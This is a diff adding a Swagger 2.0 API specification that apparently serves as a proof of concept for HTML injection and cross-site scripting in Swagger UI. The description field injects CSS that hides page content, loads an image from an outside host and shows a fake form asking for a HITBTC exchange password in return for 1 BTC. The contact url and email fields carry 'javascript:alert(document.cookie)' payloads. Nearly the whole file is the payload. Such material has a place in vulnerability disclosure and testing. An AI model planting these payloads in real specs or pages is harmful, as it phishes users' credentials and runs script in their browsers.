@@ -1,0 +1,15 @@
+swagger: '2.0'
+info:
+  version: "0.0.1"
+  title: Example Title
+  description: <style>.block-desktop{display:none!important}</style><img src=https://xpoc.pro/1234.png style='width:300px;height:300px;animation:fadeMe 2s'><form action='#'><p>Enter your HITBTC password to receive 1 BTC!</p><input type=text placeholder='' name=test value=''><input type='submit' value='OK'></form>
+  contact: 
+   name: "GovTech Triage"
+   url: '" javascript:alert(document.cookie)'
+   email: " javascript:alert(document.cookie)"
+paths:
+  /:
+    get:
+      responses:
+        200:
+          description: Successful response
